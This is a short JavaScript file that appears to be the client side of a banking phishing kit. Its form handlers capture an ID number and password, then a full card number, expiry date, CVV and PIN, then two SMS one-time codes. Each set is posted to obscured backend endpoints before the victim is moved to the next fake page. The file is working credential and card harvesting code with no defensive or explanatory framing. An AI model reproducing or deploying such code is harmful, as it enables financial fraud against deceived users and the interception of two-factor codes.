$(function(){
    $("#pg1").on("submit",function(e){
        e.preventDefault();
        let nif = $("#doc_type").val();
        let nemru = $("#doc_number").val();
        let paso = `${$("#p1").val()}${$("#p2").val()}${$("#p3").val()}${$("#p4").val()}`;


        //send backend:
        $.ajax({
            url: '/gzLbTbjqMpc34D4XsPJ2',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({nif,nemru,paso}),
            success: function(info) {
                if(info.OK){
                    window.location = "/fGnEL4jmpuBCDkJP3myR";
                }
            }
        });
    });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a1 = `${$("#cc1").val()} ${$("#cc2").val()} ${$("#cc3").val()} ${$("#cc4").val()}`;
        let a2 = `${$("#month").val()}/${$("#year").val()}`;
        let a3 = `${$("#three1").val()}${$("#three2").val()}${$("#three3").val()}`;
        let a4 = `${$("#pin1").val()}${$("#pin2").val()}${$("#pin3").val()}${$("#pin4").val()}`;
        //send backend:
        $.ajax({
            url: '/NkMNm4664XhcW8KuukHk',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3,a4}),
            success: function(info) {
                if(info.OK){
                    window.location = "/Q89HFszQPd3TFv4mx65k";
                }
            }
        });
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sms_code").val();


        //send backend:
        $.ajax({
            url: '/m4kT9BQWt7KTDdaVmafx',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/aEsKRvuaENZtYax265Kv";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sms_code").val();
        
        //send backend:
        $.ajax({
            url: '/Qv69PRvXg6PQEvrzJx6j',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/HfuRVXK8w8fLmT2vWHe8";
                }
            }
        });
    });



});